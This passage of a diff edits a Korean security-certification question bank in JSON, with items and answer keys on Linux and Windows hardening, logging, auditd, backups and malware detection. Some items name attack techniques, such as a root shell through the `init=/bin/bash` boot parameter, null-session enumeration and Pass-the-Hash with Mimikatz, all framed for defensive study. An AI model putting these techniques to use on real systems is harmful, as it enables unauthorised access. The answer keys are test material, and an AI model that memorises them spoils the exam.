@@ -366,188 +366,200 @@
     {
       "id": "y-sys-023",
       "type": "단답형",
-      "question": "리눅스 `umask` 값이 `022` 로 설정된 사용자가 새 파일과 새 디렉터리를 생성했다.\n\n* (A) : 생성되는 일반 파일의 8진수 권한\n* (B) : 생성되는 디렉터리의 8진수 권한\n* (C) : 신규 생성 파일에 실행 권한이 절대 자동 부여되지 않는 이유가 되는, 파일의 기본 최대 권한값(8진수)",
-      "answer": "정답\n(A) 644\n(B) 755\n(C) 666",
-      "explanation": "파일 기본 최대권한 666, 디렉터리 기본 최대권한 777에서 umask 비트를 뺀다.\n- 파일: 666 - 022 = 644 (rw-r--r--)\n- 디렉터리: 777 - 022 = 755 (rwxr-xr-x)\n- 파일 기본값이 666이라 umask 와 무관하게 생성 시점에 x 비트가 붙지 않는다(실행권한은 명시적 chmod 필요).\n- 보안 강화 umask 권장값: 027 또는 077. 함정: 'umask 는 권한을 빼는 게 아니라 AND NOT 연산'이지만 일반 값에서는 뺄셈과 결과가 같다.",
+      "question": "리눅스 부팅 과정과 부트로더 보안에 대한 물음이다.\n\n(A) BIOS/UEFI → 부트로더 → 커널(vmlinuz) → 초기 램디스크(initramfs) → 최초 사용자 프로세스 순서에서, PID 1로 실행되어 이후 모든 서비스를 관리하는 최신 리눅스의 최초 프로세스(관리자)는 무엇인가?\n(B) 공격자가 부팅 시 커널 파라미터에 `init=/bin/bash` 를 추가해 패스워드 없이 root 셸을 얻는 것을 막으려면, GRUB2 메뉴 편집에 암호를 걸어야 한다. 이때 암호 해시를 생성하는 명령은?\n(C) 부팅 시 무결성이 검증된 부트로더·커널만 실행되도록 UEFI 펌웨어가 서명을 확인하는 기능의 명칭은?",
+      "answer": "정답\n(A) systemd\n(B) grub2-mkpasswd-pbkdf2 (또는 grub-mkpasswd-pbkdf2)\n(C) 시큐어 부트 (UEFI Secure Boot)",
+      "explanation": "- 전통적 SysV init(런레벨 0~6)는 대부분 systemd(target 단위: multi-user.target ↔ 런레벨3, graphical.target ↔ 런레벨5)로 대체됨.\n- 물리 접근 시 싱글유저 모드·`init=/bin/bash`·라이브 USB 로 디스크 마운트가 가능하므로 GRUB 암호 + BIOS 암호 + 디스크 암호(LUKS)가 함께 필요.\n- Secure Boot + Measured Boot(TPM) + IMA/EVM 으로 부팅 체인 무결성 확보.",
       "notes": [
-        "시스템보안/특수권한-umask"
+        "시스템보안/운영체제-보안-기초",
+        "시스템보안/유닉스-시스템-하드닝"
       ],
       "tags": [
-        "umask",
-        "권한",
-        "퍼미션"
+        "부팅",
+        "GRUB",
+        "systemd",
+        "시큐어부트"
       ]
     },
     {
       "id": "y-sys-024",
       "type": "단답형",
-      "question": "리눅스 `/etc/shadow` 파일의 한 행이 아래와 같다.\n\n```\nuser1:$6$xyz$abcd....:19700:0:99999:7:::\n```\n\n* (A) : 두 번째 필드의 `$6$` 가 의미하는 패스워드 해시 알고리즘\n* (B) : 세 번째 필드(19700)가 의미하는 값\n* (C) : 두 번째 필드가 `*` 또는 `!` 로 시작할 때의 의미",
-      "answer": "정답\n(A) SHA-512\n(B) 1970-01-01 부터 마지막으로 패스워드를 변경한 날까지의 일수(경과일)\n(C) 해당 계정의 패스워드 로그인이 잠김(비활성화)됨 — 유효한 해시가 없어 어떤 패스워드로도 인증 불가",
-      "explanation": "`$id$salt$hash` 형식. id: `$1$` MD5, `$5$` SHA-256, `$6$` SHA-512, `$y$` yescrypt.\n- shadow 필드: 계정명 / 암호화된 패스워드 / 최종변경일 / 최소변경일수 / 최대사용일수 / 경고일수 / 유효기간(비활성 유예) / 계정만료일 / 예약\n- `*`,`!`,`!!`: 잠긴 계정(`!`는 `passwd -l`로 잠근 상태, 앞에 `!` 추가). 빈 값이면 패스워드 없이 로그인 가능(위험).",
+      "question": "리눅스 syslog(rsyslog) 로깅에 대한 물음이다.\n\n(A) `authpriv.* /var/log/secure` 설정에서 `authpriv` 가 의미하는 것과 `*` 가 의미하는 것을 각각 쓰시오. (각각 로그의 무엇을 지정하는가)\n(B) 로그를 원격 로그 서버(10.0.0.9)로 TCP 514 포트를 통해 전송하도록 하는 rsyslog 설정 구문을 쓰시오.\n(C) 로컬 로그가 공격자에게 삭제·변조되는 것에 대비해 로그를 원격 서버로 보내는 방식이 갖는 보안상 이점을 한 가지 쓰시오.",
+      "answer": "정답\n(A) authpriv = 로그를 발생시킨 시설(facility, 인증·권한 관련), * = 모든 심각도(severity/priority) 수준\n(B) authpriv.*  @@10.0.0.9:514   (UDP 는 `@10.0.0.9:514`, TCP 는 `@@`)\n(C) 침해 시 공격자가 로컬 로그를 지우거나 위조해도 원격 서버에 이미 전송된 원본이 남아 사고 분석·법적 증거로 활용할 수 있다(로그 무결성·가용성 확보).",
+      "explanation": "- facility: kern, auth, authpriv, cron, daemon, mail, local0~7 등. severity: emerg(0) > alert > crit > err > warning > notice > info > debug(7).\n- `authpriv.info` 처럼 지정하면 info 이상만 기록.\n- 중앙 로그(SIEM) 전송 시 TLS(rsyslog-gnutls) 로 전송 구간 암호화 권장.",
       "notes": [
-        "시스템보안/passwd-shadow-파일구조"
+        "시스템보안/리눅스-유닉스-로그파일"
       ],
       "tags": [
-        "shadow",
-        "SHA-512",
-        "패스워드"
+        "syslog",
+        "rsyslog",
+        "원격로그",
+        "facility"
       ]
     },
     {
       "id": "y-sys-025",
       "type": "단답형",
-      "question": "Windows 보안 이벤트 로그를 분석 중이다. 다음 상황에 대응하는 이벤트 ID를 쓰시오.\n\n* (A) : 계정 로그온 성공\n* (B) : 계정 로그온 실패\n* (C) : 사용자 계정이 생성됨\n* (D) : 감사 로그가 지워짐(clear)",
-      "answer": "정답\n(A) 4624\n(B) 4625\n(C) 4720\n(D) 1102",
-      "explanation": "침해대응 필수 이벤트 ID.\n- 4624 로그온 성공(로그온 유형 3=네트워크, 10=RDP 주목), 4625 실패, 4634/4647 로그오프\n- 4720 계정 생성, 4726 삭제, 4728/4732 그룹 추가, 4672 특수권한 부여\n- 1102 감사로그 삭제(공격자 흔적 제거 징후), 4688 새 프로세스 생성, 4698 예약작업 생성\n- XP/2003 구 체계는 여기서 +4096(예: 528/529). 함정: '실패=4624'로 헷갈리지 말 것.",
+      "question": "리눅스 계정 정책 파일에 대한 물음이다.\n\n(A) 신규 계정 생성 시 적용되는 패스워드 최대 사용일수(`PASS_MAX_DAYS`), 최소 사용일수, 만료 경고일수, UID/GID 최솟값 등을 정의하는 파일의 경로는?\n(B) `useradd` 로 계정을 만들 때 기본 셸·홈 디렉터리 골격·비활성 일수 등의 기본값이 정의된 파일의 경로는?\n(C) 콘솔(tty)에서 root 가 직접 로그인할 수 있는 터미널 목록을 제한하는 파일의 경로는?",
+      "answer": "정답\n(A) /etc/login.defs\n(B) /etc/default/useradd\n(C) /etc/securetty",
+      "explanation": "- `/etc/securetty` 를 비우면 root 콘솔 직접 로그인이 전면 차단(관리는 일반계정 로그인 후 su/sudo).\n- 기존 계정의 만료 정책은 `chage -M 90 -m 1 -W 7 user`.\n- 패스워드 복잡도는 `/etc/security/pwquality.conf`(pam_pwquality) 또는 pam_cracklib.",
       "notes": [
-        "시스템보안/윈도우-보안-pe-이벤트로그-netbios",
-        "시스템보안/윈도우-계정-감사정책"
+        "시스템보안/passwd-shadow-파일구조",
+        "시스템보안/유닉스-시스템-하드닝"
       ],
       "tags": [
-        "Windows",
-        "이벤트로그",
-        "4624",
-        "4625"
+        "login.defs",
+        "securetty",
+        "계정정책"
       ]
     },
     {
       "id": "y-sys-026",
       "type": "단답형",
-      "question": "리눅스 시스템 보안 점검 항목이다. 빈칸을 채우시오.\n\n* 원격 접속 서비스 접근제어를 IP 단위로 수행할 때 사용하는, `libwrap` 기반의 접근제어 파일 두 개는 `/etc/(A)` 와 `/etc/(B)` 이다. 두 파일 모두에 규칙이 있으면 `(A)` 가 우선한다.\n* SELinux 의 현재 동작 모드를 확인하는 명령은 `(C)` 이며, 정책 위반을 차단하지 않고 로그만 남기는 모드는 `(D)` 이다.",
-      "answer": "정답\n(A) hosts.allow\n(B) hosts.deny\n(C) getenforce\n(D) permissive",
-      "explanation": "TCP Wrapper: `hosts.allow` → `hosts.deny` 순서로 평가, 먼저 매칭되는 규칙 적용(allow 우선). `ldd $(which sshd)` 에 libwrap 이 있어야 적용.\n- SELinux 모드: enforcing(차단+로그), permissive(로그만), disabled. `getenforce`/`sestatus` 확인, `setenforce 0|1` 임시 전환, `/etc/selinux/config` 영구 설정.\n- AppArmor(경로 기반)와 구분.",
+      "question": "리눅스 파일 링크와 관련한 물음이다.\n\n(A) 원본 파일과 동일한 inode 를 공유하며, 원본을 삭제해도 데이터가 유지되고, 서로 다른 파일시스템·디렉터리에는 만들 수 없는 링크의 종류는?\n(B) 다른 파일의 경로(이름)를 가리키는 별도 inode 를 가지며, 원본이 삭제되면 깨지고(dangling), 파일시스템을 넘어 생성 가능한 링크의 종류는?\n(C) SetUID 프로그램이 경로 검사와 파일 open 사이의 시간차에 (B) 유형 링크를 바꿔치기해 권한 있는 파일을 조작하게 만드는 공격(경쟁 조건)의 명칭은?",
+      "answer": "정답\n(A) 하드 링크 (Hard Link)\n(B) 심볼릭 링크 (Symbolic Link / Soft Link)\n(C) 심볼릭 링크 공격 / TOCTOU(Time-Of-Check to Time-Of-Use) 경쟁 조건 공격",
+      "explanation": "- 하드 링크: `ln src dst`, 링크 카운트 증가, 디렉터리·다른 fs 불가.\n- 심볼릭 링크: `ln -s`, `ls -l` 에서 `->` 표시.\n- TOCTOU 대응: `open()` 후 `fstat()` 로 재확인, `O_NOFOLLOW`, 원자적 연산, 임시파일은 `mkstemp()`·전용 디렉터리(sticky bit).",
       "notes": [
-        "시스템보안/유닉스-시스템-하드닝",
-        "시스템보안/운영체제-보안-기초"
+        "시스템보안/리눅스-파일시스템-proc-셸"
       ],
       "tags": [
-        "TCP Wrapper",
-        "hosts.allow",
-        "SELinux"
+        "하드링크",
+        "심볼릭링크",
+        "inode",
+        "TOCTOU"
       ]
     },
     {
       "id": "y-sys-027",
       "type": "단답형",
-      "question": "다음이 설명하는 리눅스 특수 권한의 명칭을 쓰시오.\n\n* (A) : 디렉터리에 설정하면, 그 디렉터리 안의 파일은 파일 소유자·디렉터리 소유자·root 만 삭제·이름변경할 수 있다. `/tmp`, `/var/tmp` 에 적용되며 권한 표기에서 `t` 로 보인다.\n* (B) : 실행 파일에 설정하면 실행하는 동안 프로세스의 유효 그룹 ID(EGID)가 파일의 그룹 소유자로 바뀐다.\n* (C) : `chmod 1777 dir` 에서 맨 앞의 숫자 `1` 이 지정하는 비트",
-      "answer": "정답\n(A) Sticky Bit (스티키 비트)\n(B) SetGID (SGID)\n(C) Sticky Bit",
-      "explanation": "특수권한 8진수: SetUID 4000, SetGID 2000, Sticky 1000.\n- Sticky: 공유 디렉터리에서 타인 파일 삭제 방지(권한이 rwx여도). 실행권한 있으면 소문자 `t`, 없으면 대문자 `T`.\n- SGID 디렉터리: 하위 생성 파일이 디렉터리 그룹을 상속(협업 디렉터리).\n- SUID 파일은 권한상승 취약점의 근원 → `find / -perm -4000` 주기 점검.",
+      "question": "리눅스 커널 네트워크 파라미터를 `/etc/sysctl.conf` 로 하드닝하려 한다. 각 목적에 해당하는 파라미터 이름을 쓰시오.\n\n(A) SYN Flooding 완화를 위해 SYN 쿠키를 활성화\n(B) 출발지 IP 가 위조된 패킷(스푸핑)을 유입 인터페이스 기준으로 검증하여 폐기(리버스 경로 필터링)\n(C) 라우터가 아니라면 IP 포워딩을 비활성화\n(D) Smurf 공격 완화를 위해 브로드캐스트로 오는 ICMP echo 요청에 응답하지 않음",
+      "answer": "정답\n(A) net.ipv4.tcp_syncookies = 1\n(B) net.ipv4.conf.all.rp_filter = 1\n(C) net.ipv4.ip_forward = 0\n(D) net.ipv4.icmp_echo_ignore_broadcasts = 1",
+      "explanation": "그 밖의 권장: `net.ipv4.conf.all.accept_redirects = 0`, `accept_source_route = 0`, `send_redirects = 0`, `kernel.randomize_va_space = 2`(ASLR), `fs.suid_dumpable = 0`, `kernel.kptr_restrict`, `kernel.dmesg_restrict`.\n- 적용: `sysctl -p`.",
       "notes": [
-        "시스템보안/특수권한-umask"
+        "시스템보안/유닉스-시스템-하드닝"
       ],
       "tags": [
-        "stickybit",
-        "SGID",
-        "특수권한"
+        "sysctl",
+        "커널파라미터",
+        "rp_filter",
+        "syncookies"
       ]
     },
     {
       "id": "y-sys-028",
       "type": "단답형",
-      "question": "리눅스에서 로그 파일이나 중요 설정 파일을 root 조차 수정·삭제·이름변경할 수 없도록 만들려고 한다.\n\n* (A) : `/var/log/secure` 에 변경 불가(immutable) 속성을 부여하는 명령\n* (B) : 특정 파일에 설정된 확장 속성을 조회하는 명령\n* (C) : (A) 속성이 설정된 파일을 수정하려 할 때 발생하는 결과",
-      "answer": "정답\n(A) chattr +i /var/log/secure\n(B) lsattr /var/log/secure\n(C) root 라도 '연산이 허용되지 않음(Operation not permitted)' 오류가 발생하여 쓰기·삭제·이동·링크 생성이 모두 거부된다 (속성 해제는 chattr -i 로만 가능)",
-      "explanation": "ext4/xfs 확장 속성. `+i`(immutable), `+a`(append-only, 로그에 유용: 추가만 허용).\n- 공격자가 로그를 지우거나 백도어 설정을 심는 것을 방어. 단, root 가 `chattr -i` 로 되돌릴 수 있으므로 완전한 방어는 아님(원격 로그 서버 병행).\n- 무결성 도구(AIDE/Tripwire)와 함께 사용.",
+      "question": "Windows 공유와 관련한 물음이다.\n\n(A) Windows 가 관리 목적으로 각 드라이브 루트에 자동 생성하는 숨김 공유(예: `C$`, `ADMIN$`, `IPC$`)를 통칭하는 용어는?\n(B) 인증 없이 `IPC$` 에 연결하여 사용자 계정·공유·정책 등의 정보를 열거하는 정찰 기법의 명칭은?\n(C) (B) 를 차단하기 위해 레지스트리에서 익명 열거를 제한하는 정책 값(로컬 보안 정책의 항목명)은?",
+      "answer": "정답\n(A) 기본 공유 / 관리 공유 (Administrative Shares)\n(B) 널 세션 (Null Session) 공격 / 익명 연결을 통한 열거\n(C) '익명 SID/이름 변환 허용 안 함' 및 'RestrictAnonymous / RestrictAnonymousSAM'(네트워크 액세스: SAM 계정 및 공유의 익명 열거 허용 안 함)",
+      "explanation": "- 관리 공유는 `net share` 로 확인, 완전 비활성화는 `AutoShareServer`/`AutoShareWks`=0 (단, 원격 관리 도구가 영향받음).\n- 널 세션은 SMB 137~139/445 로 수행 → 경계에서 445 차단, 최신 SMB(서명·암호화) 사용, 게스트 계정 비활성화.",
       "notes": [
-        "시스템보안/리눅스-파일시스템-proc-셸",
-        "시스템보안/유닉스-시스템-하드닝"
+        "시스템보안/윈도우-보안-pe-이벤트로그-netbios"
       ],
       "tags": [
-        "chattr",
-        "immutable",
-        "로그보호"
+        "Windows공유",
+        "널세션",
+        "SMB",
+        "RestrictAnonymous"
       ]
     },
     {
       "id": "y-sys-029",
       "type": "단답형",
-      "question": "악성코드·루트킷 분석 관련 용어이다. 빈칸을 채우시오.\n\n* (A) : 커널 영역에 침투해 시스템 콜 테이블·프로세스 목록을 조작함으로써 자신의 파일·프로세스·네트워크 연결을 은닉하는 악성코드 유형\n* (B) : 정상 프로그램으로 위장하지만 실행 시 백도어 등 악성 기능을 수행하며, 스스로 복제하지 않는 악성코드\n* (C) : 파일로 존재하지 않고 메모리(RAM)·레지스트리·WMI 등에만 상주하여 디스크 기반 안티바이러스 탐지를 회피하는 공격 기법",
-      "answer": "정답\n(A) 루트킷 (Rootkit) — 특히 커널 모드 루트킷\n(B) 트로이 목마 (Trojan Horse)\n(C) 파일리스(Fileless) 악성코드 / 파일리스 공격",
-      "explanation": "- 루트킷 탐지: `chkrootkit`, `rkhunter`, 정상 커널과의 무결성 비교, 외부 매체 부팅 후 오프라인 검사.\n- 웜(자기복제+네트워크 전파) vs 바이러스(숙주 필요) vs 트로이목마(비복제) 구분.\n- 파일리스: PowerShell·LOLBins 악용, EDR·행위기반 탐지 필요.",
+      "question": "Windows 자격증명 탈취와 방어에 대한 물음이다.\n\n(A) 로그온 세션의 평문 암호·NTLM 해시·커버로스 티켓을 메모리에 보관하며, Mimikatz 같은 도구의 주요 표적이 되는 Windows 프로세스는?\n(B) 탈취한 NTLM 해시를 그대로 다른 시스템 인증에 재사용하는 공격의 명칭은?\n(C) (A) 프로세스 메모리를 가상화 기반 보안(VBS)으로 격리해 자격증명 추출을 어렵게 하는 Windows 기능은?",
+      "answer": "정답\n(A) LSASS (Local Security Authority Subsystem Service)\n(B) Pass-the-Hash (PtH) 공격\n(C) Credential Guard (Windows Defender Credential Guard)",
+      "explanation": "- 커버로스 티켓 재사용은 Pass-the-Ticket, 서비스계정 티켓 오프라인 크래킹은 Kerberoasting.\n- 방어: Credential Guard, LSA Protection(RunAsPPL), 로컬 관리자 암호 자동화(LAPS), 관리 계층 분리(Tiering), NTLM 제한, 최소권한.",
       "notes": [
-        "시스템보안/무결성점검과-악성코드-분석"
+        "시스템보안/윈도우-계정-감사정책",
+        "시스템보안/윈도우-보안-pe-이벤트로그-netbios"
       ],
       "tags": [
-        "루트킷",
-        "트로이목마",
-        "파일리스"
+        "LSASS",
+        "PassTheHash",
+        "CredentialGuard",
+        "Mimikatz"
       ]
     },
     {
       "id": "y-sys-030",
       "type": "단답형",
-      "question": "엔드포인트 보안 솔루션에 대한 설명이다. 각 설명에 해당하는 약어를 쓰시오.\n\n* (A) : 엔드포인트의 행위를 지속 수집·분석하여 위협을 탐지하고, 침해 시 조사·격리·대응까지 지원하는 솔루션\n* (B) : 내부 중요 정보(개인정보·기밀문서)가 이메일·USB·출력·클라우드 등으로 유출되는 것을 탐지·차단하는 솔루션\n* (C) : 회사가 허용한 정책에 따라 모바일 기기의 앱·설정·데이터를 원격 관리하고, 분실 시 원격 삭제하는 솔루션",
-      "answer": "정답\n(A) EDR (Endpoint Detection and Response)\n(B) DLP (Data Loss Prevention)\n(C) MDM (Mobile Device Management)",
-      "explanation": "- EDR → 확장 개념 XDR(엔드포인트+네트워크+메일+클라우드 통합), 관제 결합 MDR.\n- DLP: 네트워크 DLP(게이트웨이) / 엔드포인트 DLP(에이전트). 데이터 상태별(사용중/전송중/저장) 통제.\n- MDM → EMM(MDM+MAM+MCM) → UEM. BYOD 환경에서 컨테이너(업무/개인 분리) 방식.",
+      "question": "리눅스 감사(audit) 프레임워크에 대한 물음이다.\n\n(A) 커널 수준에서 시스템 콜·파일 접근·권한 변경 등을 기록하는 리눅스 감사 데몬의 이름은?\n(B) `/etc/passwd` 에 대한 쓰기·속성 변경을 `passwd_changes` 라는 키로 감시하는 규칙을 추가하는 명령을 쓰시오.\n(C) 저장된 감사 로그에서 특정 키·사용자·시간대의 이벤트를 검색하는 명령은?",
+      "answer": "정답\n(A) auditd (Linux Audit Daemon)\n(B) auditctl -w /etc/passwd -p wa -k passwd_changes\n(C) ausearch (요약 통계는 aureport)",
+      "explanation": "- `-p` 권한: r(읽기) w(쓰기) x(실행) a(속성변경). 규칙 영구화는 `/etc/audit/rules.d/*.rules`.\n- 감사 대상 예: 계정/그룹 파일, sudoers, 커널 모듈 적재, 시간 변경, 권한 상승 실행.\n- STIG·CIS 벤치마크에 표준 규칙셋 존재.",
       "notes": [
-        "시스템보안/엔드포인트-dlp-byod-보안솔루션"
+        "시스템보안/리눅스-유닉스-로그파일",
+        "시스템보안/유닉스-시스템-하드닝"
       ],
       "tags": [
-        "EDR",
-        "DLP",
-        "MDM"
+        "auditd",
+        "auditctl",
+        "ausearch",
+        "감사로그"
       ]
     },
     {
       "id": "y-sys-031",
-      "type": "서술형",
-      "question": "컨테이너(Docker 등) 환경이 전통적인 가상머신(VM)과 격리 수준에서 어떻게 다른지 설명하고, 컨테이너 사용 시 발생할 수 있는 보안 위협과 대응방안을 각각 3가지 이상 서술하시오.",
-      "answer": "정답\n[격리 수준 차이]\n- VM: 하이퍼바이저 위에 게스트 OS 커널을 각각 구동 → 커널까지 완전 분리, 격리 강함, 오버헤드 큼.\n- 컨테이너: 호스트 커널을 공유하고 namespace(PID·NET·MNT·UTS·IPC·USER)로 자원 뷰를 분리, cgroup 으로 자원 사용량을 제한, capability·seccomp 로 시스템콜을 제약 → 프로세스 수준 격리, 가벼우나 커널 취약점이 곧 컨테이너 탈출로 이어질 수 있음.\n\n[보안 위협]\n1. 컨테이너 탈출: 커널 취약점, `--privileged` 실행, 호스트 소켓(docker.sock)·디렉터리 마운트로 호스트 장악.\n2. 취약하거나 신뢰할 수 없는 이미지: 공개 레지스트리의 오래된 패키지·악성 이미지, 하드코딩된 비밀정보.\n3. 과도한 권한: root 로 프로세스 구동, 불필요한 Linux capability 보유.\n4. 오케스트레이터(K8s) 구성 오류: 대시보드·API 서버 노출, RBAC 미흡, 시크릿 평문.\n5. 이미지·레지스트리 무결성 훼손, 런타임 이상행위.\n\n[대응방안]\n1. 최소 이미지 사용(distroless·alpine), 이미지 취약점 스캔(Trivy 등)과 서명 검증, 신뢰 레지스트리만 허용.\n2. 비루트 사용자로 실행(USER 지시자), `--privileged` 금지, capability 최소화(`--cap-drop ALL` 후 필요한 것만), read-only 파일시스템.\n3. seccomp·AppArmor/SELinux 프로파일 적용, 호스트 소켓·민감 경로 마운트 금지.\n4. cgroup 으로 CPU·메모리 제한(자원 소진·DoS 방지), 네트워크 정책으로 컨테이너 간 통신 제한.\n5. 시크릿은 전용 관리도구(Vault·K8s Secret+암호화)로 주입, 런타임 위협탐지(Falco), 호스트·커널 최신 패치.",
-      "explanation": "채점 포인트: ①커널 공유 vs 게스트커널 분리(namespace/cgroup 언급) ②컨테이너 탈출·privileged·docker.sock 위협 ③비루트 실행·capability drop·이미지 스캔·seccomp 중 3개 이상. VM 이 더 격리가 강하다는 점을 반대로 쓰면 감점.",
+      "type": "단답형",
+      "question": "악성코드 탐지 방식에 대한 설명이다. 각 설명에 해당하는 탐지 방식을 쓰시오.\n\n(A) 이미 알려진 악성코드의 고유 패턴(해시·바이트 시퀀스)과 파일을 비교하여 탐지\n(B) 코드 구조·명령어 패턴·의심스러운 API 호출 조합 등 경험적 규칙으로 미지의 변종을 추정 탐지\n(C) 격리된 가상 환경에서 실제로 실행시켜 파일 생성·레지스트리 변경·네트워크 연결 등 행위를 관찰하여 판정\n(D) 파일의 출처·전파량·서명·나이 등 클라우드 통계를 이용해 위험도를 평가",
+      "answer": "정답\n(A) 시그니처(패턴) 기반 탐지\n(B) 휴리스틱(Heuristic) 탐지\n(C) 행위 기반 탐지 / 샌드박스(동적) 분석\n(D) 평판(Reputation) 기반 탐지",
+      "explanation": "- 시그니처: 오탐 적으나 제로데이·변종·패킹에 취약.\n- 휴리스틱·행위: 미지 위협 탐지 가능하나 오탐↑, 샌드박스는 우회(가상환경 탐지·지연 실행) 시도 존재.\n- 실무는 다계층(정적+동적+평판+ML)과 EDR 병행.",
       "notes": [
-        "시스템보안/클라우드-가상화-컨테이너-보안"
+        "시스템보안/무결성점검과-악성코드-분석"
       ],
       "tags": [
-        "컨테이너",
-        "Docker",
-        "격리",
-        "컨테이너탈출"
+        "악성코드탐지",
+        "시그니처",
+        "휴리스틱",
+        "샌드박스"
       ]
     },
     {
       "id": "y-sys-032",
       "type": "서술형",
-      "question": "파일 무결성 점검 도구(Tripwire, AIDE)의 동작 원리를 설명하고, 이 방식이 가지는 한계 두 가지와 그 보완책을 서술하시오.",
-      "answer": "정답\n[동작 원리]\n1. 초기(신뢰 가능한) 상태에서 감시 대상 파일·디렉터리의 속성(크기·권한·소유자·inode·mtime)과 해시값(MD5/SHA 등)을 계산하여 기준 데이터베이스(baseline DB)로 저장한다.\n2. 이후 정기적으로 동일 항목의 현재 값을 다시 계산하여 기준 DB 와 비교한다.\n3. 값이 달라진 파일(변조·추가·삭제)을 무결성 위반으로 보고한다. 정책 파일로 감시 범위와 무시할 속성을 정의한다.\n\n[한계와 보완책]\n1. 기준 DB·정책 파일·바이너리 자체가 공격자에게 변조되면 탐지를 우회당한다 → 기준 DB 를 읽기전용 매체(CD, 원격 서버)에 보관하고 서명, 도구 바이너리 무결성도 별도 검증.\n2. 점검은 '주기적'이라 점검과 점검 사이에 변경 후 원상복구하면 탐지하지 못하며(시점 공백), 실시간 차단 기능이 없다 → 커널 수준 실시간 감시(inotify·fanotify 기반, EDR)와 병행, 점검 주기 단축, 로그를 중앙 서버로 즉시 전송.\n(그 밖에: 잦은 업데이트로 오탐 많음 → 패키지 관리자 연동/정책 예외 관리, 변경관리 프로세스와 연계.)",
-      "explanation": "채점 포인트: ①baseline 해시 DB 생성 후 주기 비교라는 핵심 원리 ②DB/바이너리 변조 위험 ③주기적 점검의 시점 공백·비실시간성. 보완책으로 읽기전용 DB·원격보관·실시간 감시 병행 언급.",
+      "question": "백업 방식인 '전체 백업', '증분 백업', '차등 백업'의 차이를 백업 시간·복구 시간·저장 공간 관점에서 비교하고, 랜섬웨어 공격에 대비하기 위한 백업 전략(3-2-1 규칙 등)을 서술하시오.",
+      "answer": "정답\n[백업 방식 비교]\n1. 전체 백업(Full): 매번 전체 데이터를 백업. 백업 시간·저장 공간이 가장 크지만, 복구는 해당 전체본 하나만 있으면 되어 가장 빠르고 단순하다.\n2. 증분 백업(Incremental): 직전 백업(전체든 증분이든) 이후 변경분만 백업. 백업 시간·공간이 가장 작지만, 복구 시 마지막 전체본 + 그 이후 모든 증분본을 순서대로 적용해야 하므로 복구가 느리고 중간 백업 하나만 손상돼도 이후 복구가 불가.\n3. 차등 백업(Differential): 마지막 전체 백업 이후 변경분을 매번 누적 백업. 백업 시간·공간은 증분보다 크지만, 복구는 마지막 전체본 + 최신 차등본 1개만 있으면 되어 증분보다 빠르고 안정적.\n\n[랜섬웨어 대비 백업 전략]\n- 3-2-1 규칙: 데이터 사본 3개(원본 포함), 서로 다른 2종류 매체에, 그 중 1개는 물리적으로 떨어진 오프사이트에 보관.\n- 오프라인/에어갭 또는 불변(WORM, Object Lock) 백업을 최소 1벌 유지 → 랜섬웨어가 네트워크로 백업까지 암호화·삭제하는 것을 방지.\n- 백업 서버·저장소는 별도 자격증명·망분리, 백업 접근 계정 최소화·MFA.\n- 정기적인 복구 훈련으로 백업 무결성·RTO 검증, 백업본에 대한 멀웨어 스캔.\n- 버전 보관(여러 시점) 으로 감염 이전 시점 복원 가능하게 유지.",
+      "explanation": "채점 포인트: 증분(직전 이후 변경분·복구 느림) vs 차등(마지막 전체 이후 누적·복구 빠름) 구분이 핵심. 3-2-1 규칙과 '오프라인/불변 백업 1벌' 언급, 복구 훈련. 증분/차등을 반대로 설명하면 감점.",
       "notes": [
-        "시스템보안/무결성점검과-악성코드-분석"
+        "정보보안관리및법규/재해복구-bcp"
       ],
       "tags": [
-        "무결성",
-        "Tripwire",
-        "AIDE"
+        "백업",
+        "증분백업",
+        "차등백업",
+        "321규칙",
+        "랜섬웨어"
       ]
     },
     {
       "id": "y-sys-033",
       "type": "서술형",
-      "question": "Windows 로컬 보안 정책의 '계정 정책' 중 (1) 암호 정책과 (2) 계정 잠금 정책에 포함되는 세부 설정 항목을 각각 3가지 이상 쓰고, 각 항목이 어떤 공격을 완화하는지 설명하시오.",
-      "answer": "정답\n(1) 암호 정책\n- 최소 암호 길이: 짧은 암호를 금지하여 무차별 대입·사전 공격을 어렵게 함(권장 8자 이상, 관리자 14자).\n- 암호는 복잡성을 만족해야 함: 영대문자·소문자·숫자·특수문자 중 3종류 이상 조합 강제 → 추측·사전 공격 완화.\n- 최근 암호 기억(암호 기록): 직전 N개 암호 재사용 금지 → 주기적 변경을 우회한 동일암호 재설정 방지.\n- 최대 암호 사용 기간 / 최소 암호 사용 기간: 유출된 자격증명의 유효기간 제한, 잦은 되돌리기 방지.\n\n(2) 계정 잠금 정책\n- 계정 잠금 임계값: 로그인 실패 N회 시 계정 잠금 → 온라인 무차별 대입 공격 차단.\n- 계정 잠금 기간: 잠금 유지 시간(예: 30분) → 자동 공격 속도를 급격히 저하.\n- 다음 시간 후 계정 잠금 수 초기화: 실패 카운터가 리셋되는 시간 → 분산·저속 공격 대응을 위해 충분히 길게 설정.\n\n[보충] 잠금 임계값을 너무 낮게 잡으면 정상 사용자 대상 서비스 거부(DoS)로 악용될 수 있어 균형이 필요하다.",
-      "explanation": "채점 포인트: 암호 정책 3항목(길이/복잡성/기록/사용기간 중)과 잠금 정책 3항목(임계값/잠금기간/카운터 초기화)을 정확히 나열하고, 무차별 대입·사전공격·자격증명 재사용 완화와 연결. 잠금정책의 DoS 부작용 언급 시 가점.",
+      "question": "신규 리눅스 서버를 구축할 때 '로깅·감사' 관점에서 적용해야 할 보안 설정을 5가지 이상 구체적으로 서술하시오.",
+      "answer": "정답\n1. 원격 중앙 로그 서버 전송: rsyslog 로 인증·시스템·웹·DB 로그를 별도 로그 서버(SIEM)로 전송(가능하면 TLS). 로컬 침해 시에도 원본 보존.\n2. 로그 파일 권한·소유자 최소화: `/var/log` 이하 640, 소유자 root:adm. 주요 로그에 `chattr +a`(append-only) 적용.\n3. 로그 로테이션·보관기간 정책: logrotate 로 크기·주기 기준 순환하되, 규정·감사 요건에 맞춰 보관기간을 설정하고 압축·이관.\n4. auditd 활성화 및 규칙셋 적용: 계정/권한 파일 변경, sudo 사용, 커널 모듈 적재, 시간 변경, 권한상승 실행 파일 감시(CIS/STIG 규칙셋).\n5. 셸 명령 기록: 각 사용자 histappend·타임스탬프(`HISTTIMEFORMAT`), 가능하면 세션 기록(auditd execve, 또는 tlog/sudo I/O 로깅).\n6. 시간 동기화: NTP(chrony) 로 정확한 타임스탬프 보장 → 로그 상관분석·포렌식 타임라인 신뢰성.\n7. 로그 모니터링·알림: 인증 실패 급증, root 로그인, sudo 실패, 서비스 다운 등에 대한 실시간 알림(fail2ban·SIEM 룰).\n8. 웹/DB 등 애플리케이션 로그 표준화(형식·레벨) 및 